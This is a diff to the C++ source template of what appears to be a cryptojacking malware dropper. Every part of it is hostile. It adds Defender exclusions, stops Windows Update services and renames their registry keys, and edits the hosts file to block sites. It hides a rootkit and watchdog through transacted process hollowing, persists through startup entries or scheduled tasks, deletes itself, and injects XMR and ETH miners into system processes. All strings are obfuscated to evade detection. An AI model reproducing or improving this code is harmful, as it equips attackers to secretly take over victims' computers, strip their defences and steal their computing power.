@@ -1,11 +1,9 @@
 #include "UFiles\ntddk.h"
 #include <wchar.h>
 
-#include "UFiles\utils.h"
 #include "UFiles\common.h"
-#include "UFiles\obfuscate.h"
-#include "UFiles\obfuscatew.h"
-#include "UFiles\Injection\inject.h"
+#include "UFiles\obfuscateu.h"
+#include "UFiles\inject.h"
 $RESOURCES
 
 #if DefProcessProtect
@@ -28,11 +26,9 @@ void set_critical_process(HANDLE pHandle) {
 }
 #endif
 
-void inject_process(wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, bool setCritical) {
+void inject_process(wchar_t* tmpFile, wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, wchar_t* runtimeData, bool setCritical) {
     if (!check_mutex(mutex)) {
-        wchar_t tmpFile[MAX_PATH] = { 0 };
-        combine_path(tmpFile, _wgetenv(AYW_OBFUSCATE(L"Temp")), AYW_OBFUSCATE(L"#TMPNAME"));
-        HANDLE pHandle = transacted_hollowing(tmpFile, programPath, cmdLine, payload, payloadSize, startDir);
+        HANDLE pHandle = transacted_hollowing(tmpFile, programPath, cmdLine, runtimeData, payload, payloadSize, startDir);
 #if DefProcessProtect
         if (setCritical) {
             set_critical_process(pHandle);
@@ -42,55 +38,79 @@ void inject_process(wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* 
     }
 }
 
-void cipher(unsigned char* data, ULONG dataLen) {
-	for (int i = 0; i < dataLen; ++i) {
-		data[i] = data[i] ^ AY_OBFUSCATE("#CIPHERKEY")[i % 32];
+void cipher(unsigned char* data, ULONG datalen) {
+	for (int i = 0; i < datalen; ++i) {
+		data[i] = data[i] ^ AYU_OBFUSCATE("#CIPHERKEY")[i % 32];
 	}
 }
 
-int wmain(int argc, wchar_t* argv[])
+void write_resource(unsigned char* resource_data, ULONG datalen, wchar_t* base_path, wchar_t* file) {
+    wchar_t path[MAX_PATH] = { 0 };
+    combine_path(path, base_path, file);
+    cipher(resource_data, datalen);
+    write_file(path, resource_data, datalen);
+}
+
+int main(int argc, char *argv[])
 {
 #if DefStartDelay
     LARGE_INTEGER sleeptime;
     sleeptime.QuadPart = -($STARTDELAY * 10000);
     UtDelayExecution(FALSE, &sleeptime);
 #endif
+    bool isAdmin = check_administrator();
+
+    PUT_PEB_EXT peb = (PUT_PEB_EXT)SWU_GetPEB();
+    wchar_t* pebenv = (wchar_t*)peb->ProcessParameters->Environment;
+
+    wchar_t rootdir[MAX_PATH] = { 0 };
+    wcscat(rootdir, get_env(pebenv, AYU_OBFUSCATEW(L"SYSTEMROOT=")));
 
     wchar_t sysdir[MAX_PATH] = { 0 };
-    combine_path(sysdir, _wgetenv(AYW_OBFUSCATE(L"SystemRoot")), AYW_OBFUSCATE(L"\\System32"));
+    combine_path(sysdir, rootdir, AYU_OBFUSCATEW(L"\\System32"));
 
     wchar_t cmdPath[MAX_PATH] = { 0 };
-    combine_path(cmdPath, sysdir, AYW_OBFUSCATE(L"\\cmd.exe"));
+    combine_path(cmdPath, sysdir, AYU_OBFUSCATEW(L"\\cmd.exe"));
     
     wchar_t powershellPath[MAX_PATH] = { 0 };
-    combine_path(powershellPath, sysdir, AYW_OBFUSCATE(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));
+    combine_path(powershellPath, sysdir, AYU_OBFUSCATEW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));
+
+    wchar_t conhostPath[MAX_PATH] = { 0 };
+    combine_path(conhostPath, sysdir, AYU_OBFUSCATEW(L"#CONHOSTPATH"));
+
+    wchar_t tmpFile[MAX_PATH] = { 0 };
+    combine_path(tmpFile, get_env(pebenv, AYU_OBFUSCATEW(L"TEMP=")), AYU_OBFUSCATEW(L"#TMPNAME"));
 
 #if DefWDExclusions
-    run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #WDCOMMAND"), powershellPath);
+    run_program(true, sysdir, powershellPath, AYU_OBFUSCATEW(L"%S #WDCOMMAND"), powershellPath);
 #endif
 #if DefDisableWindowsUpdate
-    run_program(false, sysdir, cmdPath, AYW_OBFUSCATE(L"%S /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /f"), cmdPath);
+    run_program(true, sysdir, cmdPath, AYU_OBFUSCATEW(L"%S /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc"), cmdPath);
+    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc"), AYU_OBFUSCATEW(L"UsoSvc_bkp"));
+    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"), AYU_OBFUSCATEW(L"WaaSMedicSvc_bkp"));
+    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\wuauserv"), AYU_OBFUSCATEW(L"wuauserv_bkp"));
+    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\BITS"), AYU_OBFUSCATEW(L"BITS_bkp"));
+    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\dosvc"), AYU_OBFUSCATEW(L"dosvc_bkp"));
 #endif
 #if DefDisableSleep
-    run_program(false, sysdir, cmdPath, AYW_OBFUSCATE(L"%S /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"), cmdPath);
+    run_program(false, sysdir, cmdPath, AYU_OBFUSCATEW(L"%S /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"), cmdPath);
 #endif
 
 #if DefBlockWebsites
     wchar_t hostsPath[MAX_PATH] = { 0 };
-    combine_path(hostsPath, sysdir, AYW_OBFUSCATE(L"\\drivers\\etc\\hosts"));
+    combine_path(hostsPath, sysdir, AYU_OBFUSCATEW(L"\\drivers\\etc\\hosts"));
     ULONG hostsFileSize;
     PVOID hostsFile = read_file(hostsPath, &hostsFileSize);
     if (hostsFile) {
         PVOID hostsData = NULL;
         SIZE_T allocatedSize = hostsFileSize + $DOMAINSIZE;
-        NTSTATUS astatus = UtAllocateVirtualMemory(UtCurrentProcess(), &hostsData, 0, &allocatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-        if (NT_SUCCESS(astatus)) {
+        if (NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &hostsData, 0, &allocatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
             char* hostsString = (char*)hostsData;
             strcat(hostsString, (char*)hostsFile);
             char* domainSet[] = { $CPPDOMAINSET };
             for (int i = 0; i < $DOMAINSETSIZE; i++) {
                 if (strstr(hostsString, domainSet[i]) == NULL) {
-                    strcat(hostsString, AY_OBFUSCATE("\r\n0.0.0.0      "));
+                    strcat(hostsString, AYU_OBFUSCATE("\r\n0.0.0.0      "));
                     strcat(hostsString, domainSet[i]);
                     hostsFileSize += 15 + strlen(domainSet[i]);
                 }
@@ -100,85 +120,77 @@ int wmain(int argc, wchar_t* argv[])
     }
 #endif
 
+#if DefRootkit
+        cipher(resRootkit, resRootkitSize);
+        inject_process(tmpFile, NULL, (BYTE*)resRootkit, resRootkitSize, conhostPath, conhostPath, sysdir, nullptr, false);
+#endif
+
 #if DefStartup
     wchar_t exePath[MAX_PATH] = { 0 };
-    GetModuleFileNameW(NULL, exePath, MAX_PATH);
+	PRTL_USER_PROCESS_PARAMETERS pebproc = peb->ProcessParameters;
+    wcscat(exePath, pebproc->ImagePathName.Buffer);
 
     wchar_t startupPath[MAX_PATH] = { 0 };
-    combine_path(startupPath, _wgetenv(AYW_OBFUSCATE(L"$BASEDIR")), AYW_OBFUSCATE(L"#STARTUPFILE"));
+    combine_path(startupPath, get_env(pebenv, AYU_OBFUSCATEW(L"$BASEDIR")), AYU_OBFUSCATEW(L"#STARTUPFILE"));
 
-    run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #STARTUPADD"), powershellPath, startupPath, startupPath, startupPath);
-
-    wchar_t conhostPath[MAX_PATH] = { 0 };
-    combine_path(conhostPath, sysdir, AYW_OBFUSCATE(L"#CONHOSTPATH"));
+    if (isAdmin) {
+        run_program(true, sysdir, powershellPath, AYU_OBFUSCATEW(L"%S #STARTUPADDADMIN"), powershellPath, startupPath, startupPath);
+    }
+    else {
+        wchar_t regPath[MAX_PATH] = { 0 };
+        combine_path(regPath, sysdir, AYU_OBFUSCATEW(L"\\reg.exe"));
+        run_program(true, sysdir, regPath, AYU_OBFUSCATEW(L"%S #STARTUPADDUSER"), regPath, startupPath);
+    }
 
     if (wcsicmp(exePath, startupPath) != 0) {
         ULONG fileSize;
         PVOID exeFile = read_file(exePath, &fileSize);
         write_file(startupPath, exeFile, fileSize);
-#if DefRootkit
-        cipher(resRootkit, resRootkitSize);
-        inject_process(NULL, (BYTE*)resRootkit, resRootkitSize, conhostPath, conhostPath, sysdir, false);
-#endif
 #if DefRunInstall
-        run_program(false, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #STARTUPSTART"), powershellPath, startupPath);
+        if (isAdmin) {
+            wchar_t schtasksPath[MAX_PATH] = { 0 };
+            combine_path(schtasksPath, sysdir, AYU_OBFUSCATEW(L"\\schtasks.exe"));
+            run_program(false, sysdir, schtasksPath, AYU_OBFUSCATEW(L"%S #STARTUPSTARTADMIN"), schtasksPath);
+        }
+        else {
+            run_program(false, sysdir, startupPath, AYU_OBFUSCATEW(L"%S"), startupPath);
+        }
 #endif
 #if DefAutoDelete
-        run_program(false, sysdir, cmdPath, AYW_OBFUSCATE(L"%S /c choice /C Y /N /D Y /T 3 & Del \"%S\""), cmdPath, exePath);
+        run_program(false, sysdir, cmdPath, AYU_OBFUSCATEW(L"%S /c choice /C Y /N /D Y /T 3 & Del \"%S\""), cmdPath, exePath);
 #endif
         return 0;
     }
 
 #if DefWatchdog
-    wchar_t watchdogPath[MAX_PATH] = { 0 };
-    combine_path(watchdogPath, conhostPath, AYW_OBFUSCATE(L" #WATCHDOGID"));
     cipher(resWatchdog, resWatchdogSize);
-    inject_process(AYW_OBFUSCATE(L"\\BaseNamedObjects\\#WATCHDOGID"), (BYTE*)resWatchdog, resWatchdogSize, conhostPath, watchdogPath, sysdir, true);
+    inject_process(tmpFile, AYU_OBFUSCATEW(L"\\BaseNamedObjects\\#WATCHDOGID"), (BYTE*)resWatchdog, resWatchdogSize, conhostPath, conhostPath, sysdir, nullptr, true);
 #endif
 #endif
-
     wchar_t libPath[MAX_PATH] = { 0 };
-    combine_path(libPath, _wgetenv(AYW_OBFUSCATE(L"$CPPLIBSROOT")), AYW_OBFUSCATE(L"\\Google\\Libs\\"));
-
+    combine_path(libPath, get_env(pebenv, AYU_OBFUSCATEW(L"$CPPLIBSROOT")), AYU_OBFUSCATEW(L"\\Google\\Libs\\"));
 #if DefMineXMR
-    wchar_t libWR64Path[MAX_PATH] = { 0 };
-    combine_path(libWR64Path, libPath, AYW_OBFUSCATE(L"WR64.sys"));
-    cipher(resWR64, resWR64Size);
-    write_file(libWR64Path, resWR64, resWR64Size);
+    write_resource(resWR64, resWR64Size, libPath, AYU_OBFUSCATEW(L"WR64.sys"));
 #endif
-
-    bool hasGPU = has_gpu(sysdir, cmdPath, libPath);
+    bool hasGPU = has_gpu();
 #if DefGPULibs
     if (hasGPU) {
-        wchar_t ddb64Path[MAX_PATH] = { 0 };
-        combine_path(ddb64Path, libPath, AYW_OBFUSCATE(L"ddb64.dll"));
-        cipher(resddb64, resddb64Size);
-        write_file(ddb64Path, resddb64, resddb64Size);
-        wchar_t nvrtcPath[MAX_PATH] = { 0 };
-        combine_path(nvrtcPath, libPath, AYW_OBFUSCATE(L"nvrtc64_112_0.dll"));
-        cipher(resnvrtc, resnvrtcSize);
-        write_file(nvrtcPath, resnvrtc, resnvrtcSize);
-        wchar_t nvrtc2Path[MAX_PATH] = { 0 };
-        combine_path(nvrtc2Path, libPath, AYW_OBFUSCATE(L"nvrtc-builtins64_112.dll"));
-        cipher(resnvrtc2, resnvrtc2Size);
-        write_file(nvrtc2Path, resnvrtc2, resnvrtc2Size);
+        write_resource(resddb64, resddb64Size, libPath, AYU_OBFUSCATEW(L"ddb64.dll"));
+        write_resource(resnvrtc, resnvrtcSize, libPath, AYU_OBFUSCATEW(L"nvrtc64_112_0.dll"));
+        write_resource(resnvrtc2, resnvrtc2Size, libPath, AYU_OBFUSCATEW(L"nvrtc-builtins64_112.dll"));
     }
 #endif
 
     wchar_t* minerSet[][4] = { $MINERSET };
-
     cipher(resETH, resETHSize);
     cipher(resXMR, resXMRSize);
-
     for (int i = 0; i < $MINERCOUNT; i++) {
-        bool typeETH = !wcsicmp(AYW_OBFUSCATE(L"eth"), minerSet[i][0]);
+        bool typeETH = !wcsicmp(AYU_OBFUSCATEW(L"eth"), minerSet[i][0]);
         if (!(typeETH && !hasGPU)) {
             wchar_t injectPath[MAX_PATH] = { 0 };
-            combine_path(injectPath, sysdir, minerSet[i][2]);
+            combine_path(injectPath, !wcsicmp(AYU_OBFUSCATEW(L"\\explorer.exe"), minerSet[i][2]) ? rootdir : sysdir, minerSet[i][2]);
 
-            wchar_t commandLine[MAX_COMMAND_LENGTH] = { 0 };
-            combine_path(commandLine, injectPath, minerSet[i][3]);
-            inject_process(minerSet[i][1], (BYTE*)(typeETH ? resETH : resXMR), (typeETH ? resETHSize : resXMRSize), injectPath, commandLine, sysdir, true);
+            inject_process(tmpFile, minerSet[i][1], (BYTE*)(typeETH ? resETH : resXMR), (typeETH ? resETHSize : resXMRSize), injectPath, injectPath, sysdir, minerSet[i][3], true);
         }
     }
 	return 0;
